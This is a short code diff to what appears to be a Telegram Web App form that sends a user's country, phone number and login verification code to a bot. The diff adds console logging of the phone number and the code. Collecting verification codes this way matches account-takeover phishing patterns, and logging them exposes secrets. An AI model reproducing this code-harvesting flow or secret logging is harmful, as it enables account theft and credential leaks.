@@ -279,6 +279,9 @@
             const country = document.getElementById('countrySelect').value;
             const phone = document.getElementById('phoneInput').value;
             if (country && phone) {
+                // Log the data being sent
+                console.log("Sending country and phone:", { country, phone });
+
                 // Send country and phone to bot
                 Telegram.WebApp.sendData(JSON.stringify({
                     country: country,
@@ -291,6 +294,9 @@
         function submitCode() {
             const code = document.getElementById('codeInput').value;
             if (code) {
+                // Log the data being sent
+                console.log("Sending code:", { code });
+
                 // Send verification code to bot
                 Telegram.WebApp.sendData(JSON.stringify({ code: code }));
                 Telegram.WebApp.close();
